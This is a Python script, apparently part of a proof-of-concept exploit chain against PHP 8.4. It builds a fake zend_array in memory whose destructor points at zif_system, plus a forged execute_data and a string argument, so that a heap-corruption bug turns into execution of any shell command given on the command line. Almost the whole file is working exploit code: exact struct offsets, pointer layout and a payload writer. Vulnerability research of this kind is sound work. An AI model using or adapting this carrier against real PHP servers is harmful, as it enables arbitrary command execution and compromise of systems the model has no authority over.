#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

"""mk_fake_ht.py - build the fake `zend_array` that turns a destructor call into system().

Once the fake zend_reference points here, PHP treats this memory as an array and eventually calls
`Z_ARRVAL->pDestructor(zval*)`. Pointing that destructor at `zif_system` gives us a PHP internal call:
`zif_system(zend_execute_data *execute_data, zval *return_value)` reads its argument from the
execute_data, so the same buffer also carries a hand-built execute_data whose first argument is a
`zend_string` holding our command.

Layout (all offsets are PHP 8.4 ABI on 64-bit, verified by reading the engine's own structures):

  zend_array  at S          0x00 gc(rc,type)  0x08 flags,nTableMask  0x10 arData
                            0x18 nNumUsed,nNumOfElements  0x20 nTableSize,nInternalPointer
                            0x28 nNextFreeElement  0x30 pDestructor
  execute_data at S+0x20    0x10 return_value  0x2C num_args  0x50 arg1.value  0x58 arg1.type
  zend_string at S+0x80     rc/type, h, len, data at S+0x98

usage:
  mk_fake_ht.py --ht S_ADDR --zif ZIF_SYSTEM --cmd 'id>/tmp/poc.txt' --out ht.bin
"""
import argparse
import struct

SIZE = 384              # the carrier value length the spray uses (bin-448 with the header)
AR_DATA = 0x20          # arData also holds the fake execute_data
STRING_HEAD = 0x80
STRING_DATA = 0x98
CMDLEN_MAX = SIZE - STRING_DATA


def build(ht_addr, zif, cmd, size=SIZE):
    cmd = cmd.encode() if isinstance(cmd, str) else cmd
    if len(cmd) >= SIZE - STRING_DATA:
        raise SystemExit("command of %d bytes does not fit the %d-byte carrier"
                         % (len(cmd), SIZE))
    buf = bytearray(size)
    # zend_array
    struct.pack_into("<II", buf, 0x00, 1, 7)               # gc: refcount 1, IS_ARRAY
    struct.pack_into("<II", buf, 0x08, 0x10, 0xFFFFFFF8)   # flags, nTableMask
    struct.pack_into("<Q", buf, 0x10, ht_addr + AR_DATA)   # arData -> our execute_data
    struct.pack_into("<II", buf, 0x18, 1, 1)               # nNumUsed, nNumOfElements
    struct.pack_into("<II", buf, 0x20, 8, 0)               # nTableSize, nInternalPointer
    struct.pack_into("<Q", buf, 0x28, 0)                   # nNextFreeElement
    struct.pack_into("<Q", buf, 0x30, zif)                 # pDestructor = zif_system
    # zend_execute_data at S + AR_DATA
    e = AR_DATA
    struct.pack_into("<Q", buf, e + 0x00, 0)               # opline
    struct.pack_into("<Q", buf, e + 0x08, 0)               # call
    struct.pack_into("<Q", buf, e + 0x10, zif)             # return_value
    struct.pack_into("<Q", buf, e + 0x18, 0)               # func
    struct.pack_into("<Q", buf, e + 0x20, 0)               # This.value
    struct.pack_into("<I", buf, e + 0x28, 0)               # This.u1.type_info
    struct.pack_into("<I", buf, e + 0x2C, 1)               # num_args = 1
    struct.pack_into("<Q", buf, e + 0x30, 0)               # prev_execute_data
    struct.pack_into("<Q", buf, e + 0x38, 0)               # symbol_table
    struct.pack_into("<I", buf, e + 0x40, 0)               # call_info
    struct.pack_into("<Q", buf, e + 0x50, ht_addr + STRING_HEAD)   # arg1.value
    struct.pack_into("<I", buf, e + 0x58, 6)               # arg1.type = IS_STRING
    # zend_string at S + STRING_HEAD
    struct.pack_into("<II", buf, STRING_HEAD, 1, 0x106)    # gc: refcount 1, IS_STRING
    struct.pack_into("<Q", buf, STRING_HEAD + 0x08, 0)     # h
    struct.pack_into("<Q", buf, STRING_HEAD + 0x10, len(cmd))
    buf[STRING_DATA:STRING_DATA + len(cmd)] = cmd
    buf[STRING_DATA + len(cmd)] = 0
    return bytes(buf)


def main():
    ap = argparse.ArgumentParser(description="fake zend_array carrier for the destructor call")
    ap.add_argument("--ht", required=True, help="address the carrier must occupy (S)")
    ap.add_argument("--zif", required=True, help="addr of zif_system (libphp + its offset)")
    ap.add_argument("--cmd", required=True, help="shell command to run")
    ap.add_argument("--out", required=True)
    ap.add_argument("--size", type=int, default=SIZE)
    args = ap.parse_args()
    ht_addr = int(args.ht, 0)
    zif = int(args.zif, 0)
    blob = build(ht_addr, zif, args.cmd, args.size)
    with open(args.out, "wb") as handle:
        handle.write(blob)
    print("ht %s S=%#x zif=%#x size=%d cmd=%r" % (args.out, ht_addr, zif, len(blob), args.cmd))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
